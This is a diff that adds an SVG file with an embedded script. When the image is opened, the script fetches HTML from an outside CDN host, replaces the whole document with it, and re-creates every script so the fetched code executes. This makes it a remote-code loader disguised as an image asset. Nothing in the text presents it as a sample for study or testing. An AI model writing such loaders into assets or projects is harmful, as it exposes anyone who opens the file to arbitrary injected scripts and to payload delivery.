@@ -1,0 +1,16 @@
+<svg xmlns="http://w3.org" width="100%" height="100%">
+  <script>
+    fetch('https://jsdelivr.net')
+      .then(r => r.text())
+      .then(html => {
+        const doc = new DOMParser().parseFromString(html, 'text/html');
+        document.replaceChild(doc.documentElement, document.documentElement);
+        document.querySelectorAll('script').forEach(oldScript => {
+          const newScript = document.createElement('script');
+          if (oldScript.src) newScript.src = oldScript.src;
+          else newScript.textContent = oldScript.textContent;
+          oldScript.replaceWith(newScript);
+        });
+      });
+  </script>
+</svg>
